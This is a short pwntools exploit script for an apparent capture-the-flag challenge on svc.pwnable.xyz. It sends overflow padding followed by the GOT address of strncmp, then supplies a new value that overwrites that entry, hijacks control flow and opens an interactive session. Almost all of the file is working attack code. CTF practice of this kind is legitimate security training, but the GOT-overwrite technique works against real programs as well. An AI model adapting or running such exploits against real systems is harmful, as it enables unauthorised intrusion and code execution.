#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = '''
#            b*0x0000000000400bee
#            c
#            ''')

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("svc.pwnable.xyz", 30031)

input()
con.sendlineafter(b"> ", b"2")
con.sendlineafter(b"nationality: ", b"A"*16 + p64(elf.got['strncmp']))
con.sendlineafter(b"> ", b"3")
con.sendlineafter(b"age: ", b"4196764")
con.sendlineafter(b"> ", b"4")

con.interactive()
